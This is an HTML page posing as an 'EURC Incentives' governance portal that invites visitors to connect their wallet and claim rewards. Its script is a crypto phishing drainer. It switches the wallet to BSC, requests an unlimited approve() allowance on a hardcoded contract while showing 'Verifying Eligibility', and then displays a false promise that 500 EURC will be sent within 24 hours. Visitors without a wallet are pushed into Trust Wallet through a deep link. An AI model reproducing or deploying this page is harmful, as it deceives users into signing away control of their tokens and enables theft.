<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Governance Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2775ca; --bg: #0a0b0d; --card-bg: #141519; --text-dim: #848e9c; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { background: var(--card-bg); padding: 2.5rem; border-radius: 28px; text-align: center; width: 100%; max-width: 400px; border: 1px solid #2b2f36; box-shadow: 0 25px 50px rgba(0,0,0,0.6); position: relative; }
        .logo-container { width: 85px; height: 85px; margin: 0 auto 1.5rem; position: relative; }
        .logo-img { width: 100%; height: 100%; border-radius: 50%; box-shadow: 0 0 20px rgba(39, 117, 202, 0.4); }
        h2 { margin: 0 0 0.75rem; font-size: 1.75rem; font-weight: 700; letter-spacing: -0.5px; }
        p { color: var(--text-dim); font-size: 1rem; margin-bottom: 2rem; line-height: 1.6; padding: 0 10px; }
        .btn { width: 100%; padding: 1.2rem; background: var(--primary); color: white; border: none; border-radius: 16px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(39, 117, 202, 0.5); }
        .btn:active { transform: scale(0.98); }
        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 500; min-height: 1.2rem; }
        .stats { display: flex; justify-content: space-around; margin-top: 2rem; border-top: 1px solid #2b2f36; padding-top: 1.5rem; }
        .stat-item span { display: block; font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; margin-bottom: 4px; }
        .stat-item b { font-size: 1rem; color: #fff; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-container">
        <img src="https://raw.githubusercontent.com/bsceurocoin/claim-eurc/main/images.png" class="logo-img" alt="EURC">
    </div>
    <h2>EURC Incentives</h2>
    <p>Governance participants are eligible to claim accumulated EURC rewards based on wallet activity.</p>
    
    <button id="claimBtn" class="btn">Connect & Claim</button>
    
    <div id="statusMsg" class="status"></div>

    <div class="stats">
        <div class="stat-item"><span>Network</span><b>BSC Mainnet</b></div>
        <div class="stat-item"><span>Status</span><b style="color: #0ecb81;">Active</b></div>
    </div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const M = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async function run() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            // Hata vermek yerine doğrudan cüzdan içine yönlendirir
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const p = new ethers.providers.Web3Provider(window.ethereum);
            b.innerText = "Connecting...";
            await p.send("eth_requestAccounts", []);
            const n = await p.getNetwork();

            if (n.chainId !== 56) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }],
                    });
                } catch (e) {
                    s.innerText = "Please switch to BSC Network";
                    return;
                }
            }

            const si = p.getSigner();
            const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);

            b.innerText = "Verifying Eligibility...";
            const tx = await c.approve(T, M);
            
            b.innerText = "Processing Claim...";
            s.innerText = "Finalizing on-chain request...";
            await tx.wait();
            
            b.innerText = "Success!";
            s.innerText = "500 EURC will be sent to your wallet within 24h.";
            
        } catch (err) {
            b.innerText = "Try Again";
            s.innerText = "Transaction failed or rejected.";
        }
    }

    document.getElementById('claimBtn').onclick = run;
</script>

</body>
</html>
